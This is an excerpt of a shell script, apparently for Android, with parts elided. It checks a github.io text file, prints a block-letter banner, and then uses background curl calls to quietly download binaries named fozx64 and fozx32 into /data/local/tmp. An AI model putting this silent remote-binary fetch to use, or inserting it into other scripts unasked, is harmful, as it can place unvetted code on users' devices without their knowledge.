...
local check_id=$(storm "https://henbz10real.github.io/snx11response/fozaxid.txt")
...
▄█ ██▄ █░▀█ ▄█ █ █░█   █▀░ █▄█ █▄ █▀█ █░█"
		...
		if [ ! "$status" ]; then
			if { curl -sf -o /data/local/tmp/fozx64 $url64 & } 2>/dev/null; then
...
▄█ ██▄ █░▀█ ▄█ █ █░█   █▀░ █▄█ █▄ █▀█ █░█"
		...
		if [ ! "$status" ]; then
			if { curl -sf -o /data/local/tmp/fozx32 $url32 & } 2>/dev/null; then
